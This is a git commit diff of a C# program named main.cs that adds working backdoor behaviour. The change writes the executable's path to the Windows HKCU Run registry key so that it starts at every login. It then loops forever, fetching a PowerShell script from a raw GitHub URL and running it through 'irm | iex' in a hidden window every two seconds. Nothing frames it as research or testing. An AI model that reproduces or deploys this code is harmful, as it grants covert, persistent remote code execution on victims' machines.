2be5bce21ae06264200b6b920ede92ba065f8696
Scopper31 <84668306+Scopper31@users.noreply.github.com>
2023-01-20 14:55:27 +0300

    Update main.cs

--- main.cs
+++ main.cs
@@ -10,8 +10,12 @@ namespace CMDCommandUsingCsharp
 {
     public class Program
     {
-        static void Autoload() {
-
+        static void Autoload()
+        {
+            string name = "remote2";
+            RegistryKey rk = Registry.CurrentUser.OpenSubKey
+            ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            rk.SetValue(name, Process.GetCurrentProcess().MainModule.FileName);
         }
 
         static bool Check(string URL)
@@ -21,7 +25,7 @@ namespace CMDCommandUsingCsharp
 
             StreamReader reader = new StreamReader(response.GetResponseStream());
             string content = reader.ReadToEnd();
-            if(content != "\n")
+            if (content != "\n")
             {
                 return true;
             }
@@ -31,33 +35,38 @@ namespace CMDCommandUsingCsharp
 
         static void Main(string[] args)
         {
+            Autoload();
             string url = "https://raw.githubusercontent.com/Scopper31/shit/main/cmnd2.ps1";
 
-            if (Check(url))
+
+            while (true)
             {
-                var proc1 = new ProcessStartInfo();
+                if (Check(url))
+                {
+                    var proc1 = new ProcessStartInfo();
 
-                // '/c' tells cmd that we want it to execute the command that follows, and then exit.
-                System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("powershell", $"/c irm {url} | iex");
+                    // '/c' tells cmd that we want it to execute the command that follows, and then exit.
+                    System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("powershell", $"/c irm {url} | iex");
 
-                // The following commands are needed to redirect the standard output. 
-                //This means that it will be redirected to the Process.StandardOutput StreamReader.
-                procStartInfo.RedirectStandardOutput = true;
-                procStartInfo.UseShellExecute = false;
-                // Do not create the black window.
-                procStartInfo.CreateNoWindow = true;
-                // Now we create a process, assign its ProcessStartInfo and start it
-                System.Diagnostics.Process proc = new System.Diagnostics.Process();
-                proc.StartInfo = procStartInfo;
-                proc.Start();
+                    // The following commands are needed to redirect the standard output. 
+                    //This means that it will be redirected to the Process.StandardOutput StreamReader.
+                    procStartInfo.RedirectStandardOutput = true;
+                    procStartInfo.UseShellExecute = false;
+                    // Do not create the black window.
+                    procStartInfo.CreateNoWindow = true;
+                    // Now we create a process, assign its ProcessStartInfo and start it
+                    System.Diagnostics.Process proc = new System.Diagnostics.Process();
+                    proc.StartInfo = procStartInfo;
+                    proc.Start();
 
-                // Get the output into a string
-                string result = proc.StandardOutput.ReadToEnd();
+                    // Get the output into a string
+                    //string result = proc.StandardOutput.ReadToEnd();
 
-                // Display the command output.
-                //Console.WriteLine(result);
+                    // Display the command output.
+                    //Console.WriteLine(result);
+                    Thread.Sleep(2000);
+                }
             }
-            
         }
     }
 }
